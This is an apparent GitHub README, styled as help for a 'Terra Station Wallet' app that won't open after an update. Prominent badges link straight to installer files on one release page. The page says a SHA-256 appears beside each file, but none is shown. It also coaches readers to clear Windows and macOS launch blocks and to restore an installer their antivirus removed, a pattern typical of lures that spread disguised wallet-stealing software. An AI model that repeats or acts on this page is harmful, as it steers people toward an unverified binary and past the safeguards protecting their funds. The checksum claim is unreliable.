![Terra Station Wallet](assets/banner-article.png)

# Wallet Won't Open After an Update

<p align="center"><a href="https://github.com/terraclassic-wallet/terra-station-wallet/releases/tag/v2.5.13"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-5392F7?style=for-the-badge&labelColor=101A42&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=E2EAFB" alt="Download for Windows"></a> <a href="https://github.com/terraclassic-wallet/terra-station-wallet/releases/tag/v2.5.13"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-5392F7?style=for-the-badge&labelColor=101A42&logo=apple&logoColor=E2EAFB" alt="Download for macOS"></a> <a href="https://github.com/terraclassic-wallet/terra-station-wallet/releases/tag/v2.5.13"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-5392F7?style=for-the-badge&labelColor=101A42&logo=linux&logoColor=E2EAFB" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-5392F7?style=flat-square&labelColor=101A42&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=E2EAFB" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`terra-station-wallet-windows-v2.5.13.exe`](https://github.com/terraclassic-wallet/terra-station-wallet/releases/download/v2.5.13/terra-station-wallet-windows-v2.5.13.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-5392F7?style=flat-square&labelColor=101A42&logo=apple&logoColor=E2EAFB" alt="macOS"> | macOS 12 or later | [`terra-station-wallet-macos-v2.5.13.dmg`](https://github.com/terraclassic-wallet/terra-station-wallet/releases/download/v2.5.13/terra-station-wallet-macos-v2.5.13.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-5392F7?style=flat-square&labelColor=101A42&logo=linux&logoColor=E2EAFB" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`terra-station-wallet-linux-v2.5.13.zip`](https://github.com/terraclassic-wallet/terra-station-wallet/releases/download/v2.5.13/terra-station-wallet-linux-v2.5.13.zip) |

</div>

Every file in that table is attached to the [Terra Station Wallet release page](https://github.com/terraclassic-wallet/terra-station-wallet/releases/tag/v2.5.13), and the SHA-256 printed beside each name is the value published here.

> **Only download from this GitHub release page.** An installer offered anywhere else, however official it looks, is not a file this project published.

An app that stops launching is almost always a broken installation, not a broken wallet. The keys live in the app's local data and the LUNC lives on Terra Classic, so neither depends on the window appearing. The fix is a clean install of the current release, done in the right order so you do not lose the data that holds your wallets.

## Which kind of "won't open" this is

Three different failures look the same from outside, and they have different answers:

| Symptom | What it usually means |
|---|---|
| Nothing happens when you launch it | The executable is missing, removed by security software, or blocked by the OS |
| A window flashes and disappears | The install is incomplete or was updated over a running copy |
| A window opens and hangs on a blank screen | The app is running but not finishing start-up |

The first two are installation problems. The third is usually a data or connectivity problem, which https://github.com/terraclassic-wallet/terra-classic-wallet-guides/blob/main/terra-station-account-not-loading.md handles rather than this page.

## Before you uninstall anything

Uninstalling can take app data with it on some platforms, and if that data holds wallets you have not restored elsewhere, the phrase becomes the only way back. So do this first:

1. Confirm you have the recovery phrase for every wallet in the app, offline. If not, stop here and get it - *Recover a Terra Station Wallet with a Seed Phrase* covers what a phrase restores.
2. Note the wallet names you expect to see, so you can tell a restored app from an empty one.
3. Only then start reinstalling.

That order costs a minute and removes the only irreversible outcome in this whole page.

## Install the current release, over the old one

Most launch failures come from a build that no longer matches the machine it runs on - a partial update, a file left behind, or an install from a source that was never the release page.

1. Close the app completely, including tray icons and background processes.
2. Take the current release (https://github.com/terraclassic-wallet/terra-station-wallet/releases/tag/v2.5.13) from the release page, not from a search result.
3. Confirm the file against the published checksum before running it (https://github.com/terraclassic-wallet/terra-station-wallet-installation/blob/main/check-terra-station-download-checksum.md).
4. Install over the existing installation, then launch.
5. If it still fails, uninstall and install the current release cleanly, then open it and check that your wallets are listed.

Step 5 is where the phrase matters. If the wallets are gone, the uninstall removed the data - restore from the phrase and carry on; nothing about the chain changed.

## When the operating system is the blocker

None of these are product faults, and all of them look like "the app is broken":

- **Windows:** a downloaded installer can be held by the system's reputation check until you confirm it, and security software can remove the file afterwards, leaving a shortcut that points at nothing.
- **macOS:** an app from outside the App Store can be blocked by the system's first-launch check, and the message it shows does not always say that is what happened.
- **Linux:** an archive that was unpacked without the executable bit set will not run, and the file manager may not say why.

In each case the fix is at the operating-system layer: allow the verified file, restore it from your security software, or set the executable permission. The check that matters is unchanged - the file you are allowing must be the file whose checksum matched.

## If it opens sometimes

An app that launches on one attempt and fails on the next is usually being blocked at the operating-system layer rather than crashing. The pattern to look for is a failure that follows the same action every time - first launch after a reboot, launch from a shortcut rather than the file, or launch while another copy is already running.

Three checks cover it: start the app from the installed file rather than a pinned shortcut, make sure no second instance is running in the background, and confirm the file is still where the shortcut expects it. A shortcut left behind by a partial update points at nothing and produces exactly this intermittent behaviour.

## Getting back to a working state

If two attempts produce the same failure, change the approach rather than repeating it:

- Check free disk space. An update that runs out of room mid-write leaves an install that cannot start.
- Check whether antivirus removed the executable after installation, which is common with freshly downloaded binaries.
- Try the platform guide for your system - *Installing Terra Station Wallet on Windows*, *Installing Terra Station Wallet on macOS* or https://github.com/terraclassic-wallet/terra-station-wallet-installation/blob/main/linux-install-for-terra-station-wallet.md.
- If the window now opens but the balance never arrives, the install is fine and the problem has moved: *Account Not Loading in Terra Station Wallet* is the next page.

## What a launch failure cannot do

It cannot move, spend or lose LUNC. The wallet is a signer, and a signer that does not start signs nothing. It also cannot lock you out permanently: the phrase restores the wallet on any current install, which is why the backup is the real recovery plan and the installation is replaceable.

## Questions people ask

### I uninstalled and my wallets are gone. What now?

Restore from the recovery phrase. An uninstall can remove app data, and the phrase rebuilds every account it derives - see *Recover a Terra Station Wallet with a Seed Phrase*. Balances were never in the app, so they reappear as soon as the wallet does.

### Is it safe to reinstall over the existing installation?

Yes, and it is the first thing to try, because it preserves app data on most platforms. A clean uninstall is the fallback, not the opening move.

### The app opens but the balance never loads. Is that the same problem?

No. That is a data or network state rather than a launch failure, and reinstalling usually does not help. *Account Not Loading in Terra Station Wallet* separates a slow first read from a settled empty account.

### Could an update have damaged my wallet?

An update can damage an installation; it cannot damage a wallet, because the wallet is the phrase and the chain record behind it. Restoring on a fresh install reproduces exactly the same accounts.
